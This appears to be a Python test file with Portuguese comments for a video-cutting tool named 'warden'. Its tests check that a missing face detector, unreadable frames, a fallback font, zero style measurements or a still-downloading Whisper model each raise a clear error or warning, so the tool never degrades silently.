# Bloco A. A forma de defeito é uma só: falta uma dependência, o código segue
# com um resultado pior e ninguém é avisado. O primeiro caso custou um clipe
# entregue com o rosto na borda do quadro.

class MissingDependencySpeaks(unittest.TestCase):
    """Sem detector de rosto o corte para; nunca cai no centro calado."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        import warden_media
        self.M = warden_media
        self.dir = tempfile.mkdtemp(prefix="warden-dep-")
        self.src = _make_source(os.path.join(self.dir, "s.mp4"), w=1920, h=1080)
        self.r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                              "audio": "forbidden"})

    def _sem_detector(self):
        """Finge a máquina de um host que não tem OpenCV."""
        real = self.M.face_detection_status
        self.M.face_detection_status = lambda: (False, "OpenCV is not installed")
        self.addCleanup(lambda: setattr(self.M, "face_detection_status", real))

    def test_a_landscape_cut_with_no_crop_stops_instead_of_centring(self):
        self._sem_detector()
        with self.assertRaises(RuntimeError) as erro:
            self.M.cut(self.src, os.path.join(self.dir, "a.mp4"), self.r,
                       start=0, end=3, sound="platform")
        mensagem = str(erro.exception)
        self.assertIn("no face detection", mensagem)
        self.assertIn("--crop", mensagem, "o erro tem de dizer o que fazer")

    def test_a_named_side_is_honoured_without_a_detector(self):
        """A mensagem manda passar --crop, então --crop tem de funcionar. Um
        portão que recusa a própria saída que oferece é uma mentira."""
        self._sem_detector()
        r = self.M.cut(self.src, os.path.join(self.dir, "b.mp4"), self.r,
                       start=0, end=3, sound="platform", crop="center")
        self.assertTrue(os.path.isfile(r["out"]))
        self.assertTrue(any("no face detector on this machine" in n
                            for n in r["notes"]), r["notes"])

    def test_an_exact_percentage_is_honoured_without_a_detector(self):
        self._sem_detector()
        r = self.M.cut(self.src, os.path.join(self.dir, "c.mp4"), self.r,
                       start=0, end=3, sound="platform", crop="25")
        self.assertTrue(os.path.isfile(r["out"]))

    def test_a_portrait_source_needs_no_detector_at_all(self):
        """Nada a escolher: a fonte já tem a forma do quadro."""
        self._sem_detector()
        vertical = _make_source(os.path.join(self.dir, "v.mp4"), w=1080, h=1920)
        r = self.M.cut(vertical, os.path.join(self.dir, "d.mp4"), self.r,
                       start=0, end=3, sound="platform")
        self.assertTrue(os.path.isfile(r["out"]))

    def test_status_names_the_detector_when_it_is_missing(self):
        """`warden status` é onde se descobre isso ANTES de cortar."""
        import io
        from contextlib import redirect_stdout
        self._sem_detector()
        saida = io.StringIO()
        with redirect_stdout(saida):
            warden.cmd_status(None)
        texto = saida.getvalue()
        self.assertIn("face detection:", texto)
        self.assertIn("MISSING", texto)


class NothingDegradesQuietly(unittest.TestCase):
    """Os outros sítios da mesma varredura."""

    def setUp(self):
        import warden_media, warden_style
        self.M, self.S = warden_media, warden_style

    def test_a_clip_whose_frames_cannot_be_read_is_not_called_clean(self):
        """Sem quadros, `bottom: False` lia como 'material limpo'. É uma
        resposta que a ferramenta não tem, com a cara de uma que ela tem."""
        _ffmpeg_or_skip()
        _pillow_or_skip()
        d = tempfile.mkdtemp(prefix="warden-cego-")
        src = _make_source(os.path.join(d, "s.mp4"), seconds=4, w=1080, h=1920)
        r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                         "audio": "forbidden"})
        # Uma janela inteiramente fora do arquivo: nenhum quadro sai de lá.
        with self.assertRaises(RuntimeError) as erro:
            self.M.cut(src, os.path.join(d, "fora.mp4"), r,
                       start=900, end=903, sound="platform", crop="center")
        self.assertIn("could not open any frame", str(erro.exception))

    def test_style_check_refuses_to_pass_on_zero_measurements(self):
        """'dentro da faixa em tudo' sobre nenhuma evidência é o defeito que
        este comando existe para não ter."""
        achados = self.S.check_against({"measured": False}, {})
        self.assertTrue(any(lv == "REJECT" for lv, _m in achados), achados)
        self.assertIn("nothing was measured",
                      " ".join(m for _lv, m in achados))

    def test_the_signals_list_says_when_the_loud_signal_is_absent(self):
        """Um envelope vazio por falta de ffmpeg e um vídeo mudo são a mesma
        lista e não são a mesma coisa."""
        segs = [{"start": 0.0, "end": 2.0, "text": "sera que da certo?"}]
        _rows, why = self.M.analyze_signals(segs)          # sem fonte
        self.assertTrue(why, "silenciou sobre a ausência do sinal de som")
        self.assertIn("only the words", why)

    def test_snap_still_works_without_numpy_because_it_is_arithmetic(self):
        """A guarda não pode ser larga demais: recusar o módulo inteiro tirava
        do ar a metade dele que não precisa da dependência."""
        import warden_beat
        snapped, bars = warden_beat.snap(20.0, 2.0, 15, 25)
        self.assertIsNotNone(snapped)

    def test_the_contact_sheet_refuses_a_fallback_font(self):
        """A folha de contato É o portão. Uma folha com a fonte bitmap do PIL
        tem carimbo de tempo que ninguém lê -- é um portão que não se atravessa."""
        _ffmpeg_or_skip()
        _pillow_or_skip()
        d = tempfile.mkdtemp(prefix="warden-fonte-")
        src = _make_source(os.path.join(d, "s.mp4"), seconds=3, w=1080, h=1920)
        real = self.S.FONT_PATH
        self.S.FONT_PATH = os.path.join(d, "nao-existe.ttf")
        try:
            with self.assertRaises(RuntimeError) as erro:
                self.S.contact_sheet(src, os.path.join(d, "f.jpg"))
            self.assertIn("a fonte não está", str(erro.exception))
        finally:
            self.S.FONT_PATH = real


# ══════════════════════════════════════════════ modelo que ainda está baixando
#
# Numa instalação nova o baixador de fundo ainda corre quando o `warden status`
# já ficou verde, e o primeiro `warden cut` do host cai nessa janela.

class ModelStillDownloading(unittest.TestCase):

    def setUp(self):
        import warden_media
        self.M = warden_media
        self.home = tempfile.mkdtemp(prefix="warden-modelos-")
        self._antigo = os.environ.get("HF_HOME")
        os.environ["HF_HOME"] = self.home
        self.addCleanup(self._restaura)

    def _restaura(self):
        if self._antigo is None:
            os.environ.pop("HF_HOME", None)
        else:
            os.environ["HF_HOME"] = self._antigo

    def _bytes(self, size, mb):
        d = os.path.join(self.home, f"models--Systran--faster-whisper-{size}", "blobs")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "peso"), "wb") as fh:
            fh.write(b"\0" * int(mb * 1_000_000))

    def test_absent_and_downloading_are_not_the_same_answer(self):
        """Eram a mesma linha no status, e são coisas diferentes: numa é só
        esperar, na outra o primeiro corte puxa 484 MB no meio do pedido."""
        self.assertEqual(self.M.model_status("small")["small"]["state"], "absent")
        self._bytes("small", 200)
        self.assertEqual(self.M.model_status("small")["small"]["state"], "fetching")

    def test_progress_is_reported_in_megabytes_and_percent(self):
        self._bytes("small", 242)                       # metade de 484
        info = self.M.model_status("small")["small"]
        self.assertEqual(info["mb"], 242)
        self.assertGreater(info["pct"], 40)
        self.assertLess(info["pct"], 60)

    def test_a_complete_model_reads_as_ready(self):
        self._bytes("base", 145)
        self.assertEqual(self.M.model_status("base")["base"]["state"], "ready")

    def test_the_cut_says_how_much_is_left_instead_of_failing(self):
        self._bytes("small", 200)
        aviso = self.M.model_wait_note("small")
        self.assertIn("284 MB to go", aviso)
        self.assertIn("--model tiny", aviso, "tem de dizer a saída, não só o problema")

    def test_a_ready_model_produces_no_warning_at_all(self):
        self._bytes("base", 145)
        self.assertIsNone(self.M.model_wait_note("base"))

    def test_transcribe_refuses_with_the_progress_rather_than_blocking(self):
        """O WhisperModel() simplesmente começava um download de cinco minutos
        sem uma linha na tela. Cinco minutos de silêncio num chat lê como agente
        morto."""
        _ffmpeg_or_skip()
        try:
            import faster_whisper  # noqa: F401
        except ImportError:
            raise unittest.SkipTest("faster-whisper não está instalado")
        d = tempfile.mkdtemp(prefix="warden-src-")
        src = _make_source(os.path.join(d, "s.mp4"), seconds=3)
        self._bytes("small", 100)
        with self.assertRaises(RuntimeError) as erro:
            self.M.transcribe(src, model_size="small", progress=lambda _l: None)
        self.assertIn("still downloading", str(erro.exception))

    def test_the_fetch_state_file_is_believed_when_it_says_failed(self):
        with open(os.path.join(self.home, "fetch-state"), "w") as fh:
            fh.write("started=1\nsmall=fetching\nsmall=failed\n")
        info = self.M.model_status("small")["small"]
        self.assertEqual(info["state"], "failed")
        self.assertIn("failed to download at boot", self.M.model_wait_note("small"))
